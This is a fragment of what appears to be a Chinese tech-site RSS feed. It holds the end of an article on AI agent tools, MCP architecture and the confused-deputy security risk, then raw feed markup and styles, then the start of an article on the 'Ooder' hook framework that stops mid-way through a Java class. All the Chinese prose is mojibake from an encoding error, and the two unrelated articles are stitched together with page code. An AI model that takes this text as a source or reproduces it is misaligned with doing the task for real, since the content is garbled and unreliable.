<p>å†…ç½®å·¥å…·ç”±æ¨¡å‹æœåŠ¡æä¾›æ–¹éšå¼æä¾›ï¼Œå¼€å‘è€…é€šå¸¸æ— æ³•ç›´æ¥çœ‹åˆ°å…¶å®ç°ç»†èŠ‚ã€‚å¸¸è§ç¤ºä¾‹åŒ…æ‹¬ï¼š</p>
<ul>
<li>åŸºäºæœç´¢çš„ Grounding èƒ½åŠ›</li>
<li>ä»£ç æ‰§è¡Œ</li>
<li>é€šè¿‡ URL è·å–å†…å®¹</li>
</ul>
<p>è¿™äº›èƒ½åŠ›é€šå¸¸ä½œä¸ºå¹³å°ç‰¹æ€§å­˜åœ¨ï¼Œå¼€å‘è€…åªéœ€ä½¿ç”¨è€Œæ— éœ€å®šä¹‰ã€‚</p>
<h4 data-id="heading-6">ï¼ˆ3ï¼‰ä»£ç†å·¥å…·ï¼ˆAgent Toolsï¼‰</h4>
<p>ä»£ç†å·¥å…·æ˜¯ä¸€ç§æ›´é«˜é˜¶çš„æŠ½è±¡ï¼šå°†å¦ä¸€ä¸ªç‹¬ç«‹ Agent ä½œä¸ºå·¥å…·è¿›è¡Œè°ƒç”¨ã€‚</p>
<p>å…¶å…³é”®ç‰¹å¾åŒ…æ‹¬ï¼š</p>
<ul>
<li>ä¸» Agent ä»ç„¶ä¿æŒæ§åˆ¶æƒ</li>
<li>å­ Agent ä»…ä½œä¸ºèƒ½åŠ›æ¨¡å—è¢«è°ƒç”¨</li>
<li>è¿”å›ç»“æœè¢«ä¸» Agent ç”¨ä½œåç»­æ¨ç†çš„è¾“å…¥</li>
</ul>
<p>è¿™æ˜¯ä¸€ç§åˆ†å±‚ã€å§”æ´¾å¼çš„åä½œæ¨¡å‹ï¼Œç±»ä¼¼äºç®¡ç†è€…å‘ä¸“å®¶å›¢é˜Ÿè¯·æ±‚åˆ†ææŠ¥å‘Šï¼Œè€Œéå°†æ•´ä¸ªä»»åŠ¡å®Œå…¨ç§»äº¤ã€‚</p>
<hr/>
<h2 data-id="heading-7">ä¸‰ã€å·¥å…·çš„åŠŸèƒ½æ€§åˆ†ç±»ï¼ˆTaxonomyï¼‰</h2>
<p>ä»æ›´å®è§‚çš„è§’åº¦ï¼Œå·¥å…·è¿˜å¯æŒ‰ç”¨é€”åˆ’åˆ†ä¸ºï¼š</p>
<ul>
<li>ä¿¡æ¯æ£€ç´¢ç±»ï¼šè·å–æ•°æ®ã€æŸ¥è¯¢çŠ¶æ€</li>
<li>åŠ¨ä½œæ‰§è¡Œç±»ï¼šå¯¹å¤–éƒ¨ç³»ç»Ÿäº§ç”Ÿå˜æ›´</li>
<li>ç³»ç»Ÿ / API é›†æˆç±»ï¼šä¸ç¬¬ä¸‰æ–¹è½¯ä»¶ç³»ç»Ÿäº¤äº’</li>
<li>äººç±»ä»‹å…¥ç±»ï¼ˆHuman-in-the-loopï¼‰ï¼šåœ¨å…³é”®èŠ‚ç‚¹è¯·æ±‚äººå·¥ç¡®è®¤æˆ–æ¾„æ¸…</li>
</ul>
<hr/>
<h2 data-id="heading-8">å››ã€Agent å·¥å…·è®¾è®¡çš„å…³é”®æœ€ä½³å®è·µ</h2>
<p>å·¥å…·æ˜¯å¦â€œå¯ç”¨â€ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºè®¾è®¡è´¨é‡ã€‚ä»¥ä¸‹å®è·µå¹¶éå»ºè®®ï¼Œè€Œæ˜¯å·¥ç¨‹ä¸Šçš„å¿…è¦æ¡ä»¶ã€‚</p>
<h3 data-id="heading-9">4.1 æ–‡æ¡£ä¼˜å…ˆï¼ˆDocumentation is Paramountï¼‰</h3>
<p>æ¨¡å‹ç†è§£å·¥å…·çš„å”¯ä¸€æ–¹å¼æ˜¯å¼€å‘è€…æä¾›çš„æ–‡æ¡£ä¿¡æ¯ï¼ŒåŒ…æ‹¬å·¥å…·åç§°ã€æè¿°æ–‡æœ¬ä¸å‚æ•°å®šä¹‰ã€‚è¿™äº›å†…å®¹ä¼šè¢«ç›´æ¥æ³¨å…¥æ¨¡å‹ä¸Šä¸‹æ–‡ã€‚</p>
<p>æ¸…æ™°ã€å…·ä½“çš„å‘½åè‡³å…³é‡è¦ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>æ­£ä¾‹ï¼š<code>create_critical_bug_with_priority</code></li>
<li>åä¾‹ï¼š<code>update_jira</code></li>
</ul>
<h3 data-id="heading-10">4.2 æè¿°â€œåšä»€ä¹ˆâ€ï¼Œè€Œéâ€œæ€ä¹ˆåšâ€</h3>
<p>å·¥å…·æè¿°åº”èšç„¦äºä»»åŠ¡ç›®æ ‡ï¼Œè€Œéå…·ä½“è°ƒç”¨æ–¹å¼ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>æ­£ç¡®ï¼šåˆ›å»ºä¸€ä¸ªç¼ºé™·è®°å½•ä»¥æè¿°è¯¥é—®é¢˜</li>
<li>é”™è¯¯ï¼šè°ƒç”¨ <code>create_bug</code> å‡½æ•°</li>
</ul>
<p>æ¨¡å‹åº”è´Ÿè´£æ¨ç†å†³ç­–ï¼Œå·¥å…·ä»…è´Ÿè´£æ‰§è¡Œã€‚</p>
<h3 data-id="heading-11">4.3 å‘å¸ƒä»»åŠ¡ï¼Œè€Œéæš´éœ²åº•å±‚ API</h3>
<p>åº”é¿å…å¯¹å¤æ‚ä¼ä¸š API è¿›è¡Œè–„å°è£…ã€‚ç†æƒ³çš„å·¥å…·åº”ï¼š</p>
<ul>
<li>å°è£…å•ä¸€ã€é«˜å±‚è¯­ä¹‰ä»»åŠ¡</li>
<li>éšè—åº•å±‚ç³»ç»Ÿå¤æ‚æ€§</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>æ­£ä¾‹ï¼š<code>book_meeting_room</code></li>
<li>åä¾‹ï¼šç›´æ¥æš´éœ²åŒ…å«åä½™å‚æ•°çš„æ—¥å† API</li>
</ul>
<h3 data-id="heading-12">4.4 è¾“å‡ºåº”å°½é‡ç®€æ´</h3>
<p>å°†å¤§é‡åŸå§‹æ•°æ®ç›´æ¥å¡å›æ¨¡å‹ä¸Šä¸‹æ–‡ä¼šå¯¼è‡´ä¸Šä¸‹æ–‡çª—å£è†¨èƒ€ã€æˆæœ¬ä¸å»¶è¿Ÿä¸Šå‡ï¼Œå¹¶æ˜¾è‘—é™ä½æ¨ç†è´¨é‡ã€‚æ¨èåšæ³•åŒ…æ‹¬ï¼š</p>
<ul>
<li>è¿”å›æ‘˜è¦ä¿¡æ¯</li>
<li>è¿”å›ç¡®è®¤çŠ¶æ€</li>
<li>è¿”å›å¤–éƒ¨èµ„æºå¼•ç”¨ï¼ˆå¦‚ URIï¼‰</li>
</ul>
<h3 data-id="heading-13">4.5 é”™è¯¯å¿…é¡»â€œå¯æŒ‡å¯¼â€</h3>
<p>é”™è¯¯ä¿¡æ¯ä¸åº”ä»…æ˜¯çŠ¶æ€ç ã€‚ä¼˜ç§€çš„é”™è¯¯å“åº”åº”æ˜ç¡®æŒ‡å‡ºé—®é¢˜åŸå› ï¼Œå¹¶æä¾›å¯æ‰§è¡Œçš„æ¢å¤å»ºè®®ã€‚ä¾‹å¦‚ï¼šâ€œAPI è§¦å‘é™æµï¼Œè¯·ç­‰å¾… 15 ç§’åé‡è¯•â€ã€‚</p>
<hr/>
<h2 data-id="heading-14">äº”ã€MCPï¼ˆModel Context Protocolï¼‰ï¼šå·¥å…·æ ‡å‡†åŒ–åè®®</h2>
<h3 data-id="heading-15">5.1 åè®®èƒŒæ™¯</h3>
<p>MCP äº 2024 å¹´æå‡ºï¼Œæ—¨åœ¨è§£å†³æ¨¡å‹ä¸å·¥å…·é›†æˆä¸­çš„ n Ã— m å¤æ‚æ€§é—®é¢˜ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯å®ç° Agent ä¸å·¥å…·ä¹‹é—´çš„è§£è€¦ä¸æ ‡å‡†åŒ–è¿æ¥ã€‚è¯¥åè®®åœ¨æ¶æ„æ€æƒ³ä¸Šå€Ÿé‰´äº† Language Server Protocolï¼ˆLSPï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-16">å…­ã€MCP çš„æ ¸å¿ƒæ¶æ„ç»„ä»¶</h2>
<p>MCP é‡‡ç”¨å…¸å‹çš„ Clientâ€“Server æ¶æ„ï¼ŒåŒ…å«ä¸‰ä¸ªæ ¸å¿ƒè§’è‰²ã€‚</p>
<h3 data-id="heading-17">6.1 MCP Host</h3>
<ul>
<li>è´Ÿè´£æ•´ä½“ç”¨æˆ·ä½“éªŒ</li>
<li>ç®¡ç† Agent æ¨ç†æµç¨‹</li>
<li>å†³å®šä½•æ—¶è°ƒç”¨å·¥å…·</li>
<li>å¼ºåˆ¶æ‰§è¡Œå®‰å…¨ç­–ç•¥ä¸æ²»ç†è§„åˆ™</li>
</ul>
<h3 data-id="heading-18">6.2 MCP Client</h3>
<ul>
<li>åµŒå…¥åœ¨ Host å†…éƒ¨</li>
<li>ç®¡ç†ä¼šè¯ç”Ÿå‘½å‘¨æœŸ</li>
<li>å‘ Server å‘é€å·¥å…·æ‰§è¡Œè¯·æ±‚</li>
</ul>
<h3 data-id="heading-19">6.3 MCP Server</h3>
<ul>
<li>æä¾›å…·ä½“å·¥å…·èƒ½åŠ›</li>
<li>å£°æ˜å¯ç”¨å·¥å…·</li>
<li>æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›ç»“æœ</li>
</ul>
<p>è¿™ç§åˆ†ç¦»ä½¿ Agent å¼€å‘ä¸å·¥å…·å®ç°å¯ä»¥ç”±ä¸åŒå›¢é˜Ÿç”šè‡³ç¬¬ä¸‰æ–¹ç‹¬ç«‹å®Œæˆã€‚</p>
<hr/>
<h2 data-id="heading-20">ä¸ƒã€é€šä¿¡æœºåˆ¶ä¸ä¼ è¾“æ–¹å¼</h2>
<ul>
<li>é€šä¿¡åè®®ï¼šJSON-RPC 2.0</li>
<li>æœ¬åœ°ä¼ è¾“ï¼šæ ‡å‡†è¾“å…¥ / è¾“å‡ºï¼ˆé«˜æ•ˆã€ä½å»¶è¿Ÿï¼‰</li>
<li>è¿œç¨‹ä¼ è¾“ï¼šå¯æµå¼ HTTPï¼ˆæ”¯æŒ SSEï¼Œé€‚åˆé•¿æ—¶é—´ä»»åŠ¡ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-21">å…«ã€MCP ä¸­çš„å·¥å…·å®šä¹‰ä¸æ‰§è¡Œ</h2>
<h3 data-id="heading-22">8.1 æ ‡å‡†åŒ– Schema</h3>
<p>å·¥å…·å®šä¹‰å¿…é¡»åŒ…å«åç§°ã€æè¿°ã€è¾“å…¥ Schemaï¼ˆå¿…éœ€ï¼‰ä»¥åŠè¾“å‡º Schemaï¼ˆå¯é€‰ï¼‰ã€‚Schema æ˜ç¡®è§„å®šè°ƒç”¨æ–¹å¼ä¸ç»“æœç»“æ„ï¼Œä»è€Œæ¶ˆé™¤æ­§ä¹‰ã€‚</p>
<h3 data-id="heading-23">8.2 å·¥å…·æ‰§è¡Œç»“æœ</h3>
<ul>
<li>ç»“æ„åŒ–ç»“æœï¼šç¬¦åˆ Schema çš„ JSONï¼ˆæ¨èï¼‰</li>
<li>éç»“æ„åŒ–ç»“æœï¼šæ–‡æœ¬ã€æ–‡ä»¶ã€URI å¼•ç”¨ç­‰</li>
</ul>
<h3 data-id="heading-24">8.3 é”™è¯¯å¤„ç†æœºåˆ¶</h3>
<ul>
<li>åè®®çº§é”™è¯¯ï¼šJSON-RPC è°ƒç”¨å¤±è´¥</li>
<li>æ‰§è¡Œçº§é”™è¯¯ï¼šå·¥å…·é€»è¾‘å¤±è´¥ï¼Œé€šè¿‡ <code>is_error</code> æ ‡è¯†è¿”å›</li>
</ul>
<hr/>
<h2 data-id="heading-25">ä¹ã€MCP å¸¦æ¥çš„æˆ˜ç•¥ä»·å€¼</h2>
<ul>
<li>åŠ é€Ÿå¼€å‘</li>
<li>ä¿ƒè¿›å·¥å…·å¤ç”¨ç”Ÿæ€</li>
<li>æ”¯æŒè¿è¡Œæ—¶å·¥å…·å‘ç°</li>
<li>è§£è€¦ Agent æ¨ç†ä¸æ‰§è¡Œ</li>
<li>æ”¯æŒ Agent Mesh ç­‰æ¨¡å—åŒ–æ¶æ„</li>
</ul>
<hr/>
<h2 data-id="heading-26">åã€æ‰©å±•æ€§æŒ‘æˆ˜ï¼šå·¥å…·è§„æ¨¡ä¸ä¸Šä¸‹æ–‡é™åˆ¶</h2>
<p>å½“ Agent å¯è®¿é—®çš„å·¥å…·æ•°é‡è¾¾åˆ°æ•°ç™¾ç”šè‡³æ•°åƒçº§åˆ«æ—¶ï¼Œä¸Šä¸‹æ–‡æˆæœ¬å°†ä¸å¯æ¥å—ï¼Œæ¨ç†è´¨é‡ä¹Ÿä¼šæ€¥å‰§ä¸‹é™ã€‚</p>
<h3 data-id="heading-27">è§£å†³æ–¹å‘ï¼šTool Retrievalï¼ˆå·¥å…·æ£€ç´¢ï¼‰</h3>
<p>å¯é‡‡ç”¨ç±»ä¼¼ RAG çš„æœºåˆ¶ï¼š</p>
<ol start="0">
<li>å…ˆè¿›è¡Œè¯­ä¹‰æ£€ç´¢</li>
<li>é€‰å‡ºå°‘é‡æœ€ç›¸å…³å·¥å…·</li>
<li>ä»…åŠ è½½è¿™äº›å·¥å…·çš„å®šä¹‰è¿›å…¥ä¸Šä¸‹æ–‡</li>
</ol>
<hr/>
<h2 data-id="heading-28">åä¸€ã€å®‰å…¨æŒ‘æˆ˜ï¼šConfused Deputy é—®é¢˜</h2>
<p>MCP åè®®æœ¬èº«ç¼ºä¹å¼ºè®¤è¯ä¸æˆæƒæœºåˆ¶ï¼Œå­˜åœ¨è¢« Prompt Injection åˆ©ç”¨çš„é£é™©ã€‚æ‰€è°“ Confused Deputyï¼Œæ˜¯æŒ‡ä½æƒé™ç”¨æˆ·é€šè¿‡è¯±å¯¼ Agentï¼Œè§¦å‘é«˜æƒé™ MCP Server æ‰§è¡Œæ•æ„Ÿæ“ä½œã€‚</p>
<h3 data-id="heading-29">ä¼ä¸šçº§åº”å¯¹ç­–ç•¥</h3>
<ul>
<li>ä¸ç›´æ¥æš´éœ² MCP Server</li>
<li>ä½¿ç”¨ API Gateway è¿›è¡Œç»Ÿä¸€æ²»ç†</li>
<li>å®æ–½è®¤è¯ã€æˆæƒã€é™æµã€å®¡è®¡ä¸è¾“å…¥è¿‡æ»¤</li>
</ul>
<p>å®‰å…¨åº”æ„å»ºåœ¨ MCP ä¹‹ä¸Šï¼Œè€Œéä¾èµ– MCP æœ¬èº«ã€‚</p>
<hr/>
<h2 data-id="heading-30">åäºŒã€æ€»ç»“ä¸æ€è€ƒ</h2>
<p>è¯­è¨€æ¨¡å‹æ˜¯â€œæ€è€ƒå¼•æ“â€ï¼Œå·¥å…·æ˜¯â€œè¡ŒåŠ¨æ¥å£â€ï¼ŒMCP æ­£åœ¨æˆä¸ºäºŒè€…ä¹‹é—´çš„é€šç”¨è¯­è¨€ã€‚çœŸæ­£çš„ä»·å€¼æ¥è‡ªäºä¸¥è°¨çš„å·¥å…·è®¾è®¡ã€æ¸…æ™°çš„èŒè´£åˆ†ç¦»ï¼Œä»¥åŠå¤–å›´å¼ºæ²»ç†ä¸å®‰å…¨ä½“ç³»ã€‚</p>
<p>å¼€æ”¾æ€§é—®é¢˜åœ¨äºï¼šåœ¨ Agent è¶Šæ¥è¶Šè‡ªä¸»çš„ç³»ç»Ÿä¸­ï¼Œå¦‚ä½•ç¡®ä¿å…¶è¡Œä¸ºå§‹ç»ˆåæ˜ çš„æ˜¯ç”¨æˆ·è¢«æˆæƒçš„çœŸå®æ„å›¾ï¼Œè€Œéä»…ä»…æ‰§è¡Œäº†è¢«è¯·æ±‚çš„æŒ‡ä»¤ï¼Ÿå®¡è®¡ã€æˆæƒä¸è´£ä»»è¾¹ç•Œï¼Œä»æ˜¯ Agentic AI å¿…é¡»ç›´é¢çš„æ ¸å¿ƒè®®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®æˆ˜ï½œOoder é’©å­æœºåˆ¶å…¨è§£æï¼šAI ååŒå¼€å‘ä¸æƒé™æ¡†æ¶é›†æˆå®æˆ˜]]></title>    <link>https://juejin.cn/post/7589916567876665386</link>    <guid>https://juejin.cn/post/7589916567876665386</guid>    <pubDate>2026-01-02T03:35:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589916567876665386" data-draft-id="7589916567876616234" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®æˆ˜ï½œOoder é’©å­æœºåˆ¶å…¨è§£æï¼šAI ååŒå¼€å‘ä¸æƒé™æ¡†æ¶é›†æˆå®æˆ˜"/> <meta itemprop="keywords" content="åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-02T03:35:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®æˆ˜ï½œOoder é’©å­æœºåˆ¶å…¨è§£æï¼šAI ååŒå¼€å‘ä¸æƒé™æ¡†æ¶é›†æˆå®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T03:35:09.000Z" title="Fri Jan 02 2026 03:35:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¼ä¸šçº§åº”ç”¨å¼€å‘ä¸­ï¼ŒOoder æ¡†æ¶ä»¥æ³¨è§£é©±åŠ¨ã€DSM é¢†åŸŸå»ºæ¨¡ã€A2UI åè®®ä¸ºæ ¸å¿ƒï¼Œé€šè¿‡é’©å­æœºåˆ¶å®ç°äº†å‰ç«¯è§†å›¾ä¸åç«¯ä¸šåŠ¡é€»è¾‘çš„é«˜æ•ˆè§£è€¦ã€‚å°¤å…¶æ˜¯ AI èµ‹èƒ½çš„ä»£ç ç”Ÿæˆèƒ½åŠ›ï¼Œè®©å¼€å‘è€…ä»é‡å¤çš„æ¨¡æ¿ä»£ç ä¸­è§£æ”¾å‡ºæ¥ï¼Œä¸“æ³¨äºæ ¸å¿ƒä¸šåŠ¡é€»è¾‘ã€‚æœ¬æ–‡å°†ä»¥ç”¨æˆ·ç®¡ç†æ¨¡å—ä¸ºä¾‹ï¼Œæ·±åº¦æ‹†è§£ Ooder é’©å­çš„å¼€å‘æµç¨‹ï¼Œæ˜ç¡® AI è¾…åŠ©ç”Ÿæˆä¸äººå·¥è¡¥å……çš„è¾¹ç•Œï¼Œå¹¶é›†æˆ Ooder æƒé™æ¡†æ¶å®ç°ç»†ç²’åº¦å®‰å…¨æ§åˆ¶ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒæ¦‚å¿µï¼šOoder é’©å­ä¸ AI ååŒå¼€å‘æ¨¡å¼</h2>
<p>Ooder çš„é’©å­æœºåˆ¶å¹¶éç®€å•çš„å‡½æ•°å›è°ƒï¼Œè€Œæ˜¯ä¸€å¥—â€œç»“æ„åŒ–ç”Ÿæˆ+é¢†åŸŸé©±åŠ¨æ‰©å±•+æ™ºèƒ½ä¼˜åŒ–â€çš„ä¸€ä½“åŒ–ä½“ç³»ã€‚å…¶æ ¸å¿ƒä»·å€¼åœ¨äºï¼š</p>
<ul>
<li>ä½œä¸º A2UI åè®®çš„åç«¯æ”¯æ’‘ï¼Œæ‰“é€šå‰ç«¯è§†å›¾ä¸åç«¯é€»è¾‘çš„æ ‡å‡†åŒ–è¿æ¥ï¼›</li>
<li>æ‰¿æ¥ AI ç”Ÿæˆçš„æ ‡å‡†åŒ–ä»£ç ï¼Œå¼€å‘è€…èšç„¦å®šåˆ¶åŒ–ä¸šåŠ¡é€»è¾‘ï¼Œå½¢æˆâ€œAI åšæ ‡å‡†åŒ–ã€äººç±»åšåˆ›é€ æ€§â€çš„ååŒæ¨¡å¼ï¼›</li>
<li>å¤©ç„¶æ”¯æŒæƒé™æ§åˆ¶ã€è·¨æ¨¡å—è°ƒç”¨ç­‰ä¼ä¸šçº§éœ€æ±‚ï¼Œå…¼é¡¾æ‰©å±•æ€§ä¸ç¨³å®šæ€§ã€‚</li>
</ul>
<p>AI ä¸å¼€å‘è€…çš„åˆ†å·¥è¾¹ç•Œæ¸…æ™°ï¼š</p>
<ul>
<li>AI è´Ÿè´£ç”Ÿæˆæ¡†æ¶æ€§ã€æ ‡å‡†åŒ–ä»£ç ï¼ˆå¦‚æ³¨è§£é…ç½®ã€è¿”å›ç»“æ„ã€æ—¥å¿—æ¨¡æ¿ç­‰ï¼‰ï¼›</li>
<li>å¼€å‘è€…è¡¥å……ä¸šåŠ¡é€»è¾‘ã€æƒé™æ ¡éªŒã€å¤æ‚æ•°æ®è½¬æ¢ç­‰ä¸å…·ä½“åœºæ™¯å¼ºç›¸å…³çš„ä»£ç ã€‚</li>
</ul>
<h2 data-id="heading-1">äºŒã€å®æˆ˜å®ç°ï¼šç”¨æˆ·ç®¡ç†æ¨¡å—é’©å­æ§åˆ¶å™¨</h2>
<p>ä»¥ä¸‹æ˜¯å®Œæ•´çš„ç”¨æˆ·ç®¡ç†æ¨¡å—é’©å­æ§åˆ¶å™¨å®ç°ï¼Œé€šè¿‡æ³¨é‡Šæ˜ç¡®æ ‡æ³¨ AI ç”Ÿæˆä¸äººå·¥è¡¥å……éƒ¨åˆ†ï¼Œå¹¶é›†æˆ Ooder åŸç”Ÿæƒé™æ¡†æ¶ã€‚</p>
<h3 data-id="heading-2">2.1 ä¾èµ–åŸºç¡€ï¼šæ ¸å¿ƒæ³¨è§£ä¸æ•°æ®æ¨¡å‹</h3>
<p>Ooder åŸºäºæ³¨è§£é©±åŠ¨å¼€å‘ï¼Œæ ¸å¿ƒæ³¨è§£æ¶µç›–è§†å›¾é…ç½®ã€äº‹ä»¶ç»‘å®šã€æƒé™æ§åˆ¶ç­‰åœºæ™¯ã€‚AI ä¼šè‡ªåŠ¨è¯†åˆ«ä¸šåŠ¡åœºæ™¯ç”Ÿæˆé€‚é…çš„ç»“æ„åŒ–æ³¨è§£ï¼Œå¼€å‘è€…ä»…éœ€æ ¹æ®éœ€æ±‚å¾®è°ƒã€‚</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-comment">// AI è‡ªåŠ¨ç”Ÿæˆï¼šDSM é¢†åŸŸæ¨¡å‹å…³è”çš„æ•°æ®ä¼ è¾“å¯¹è±¡ï¼ˆDTOï¼‰</span>
<span class="hljs-meta">@DataMapping(target = "userInfo")</span> <span class="hljs-comment">// å‰åç«¯æ•°æ®æ˜ å°„æ³¨è§£ï¼ŒAI è‡ªåŠ¨ç”Ÿæˆ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserListItem</span> {
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String userName;
    <span class="hljs-keyword">private</span> String status;
    <span class="hljs-keyword">private</span> String statusText; <span class="hljs-comment">// äººå·¥è¡¥å……ï¼šçŠ¶æ€æ–‡æœ¬æ˜ å°„å­—æ®µ</span>
}

<span class="hljs-meta">@DataMapping(target = "userForm")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserFormInfo</span> {
    <span class="hljs-keyword">private</span> String userId;
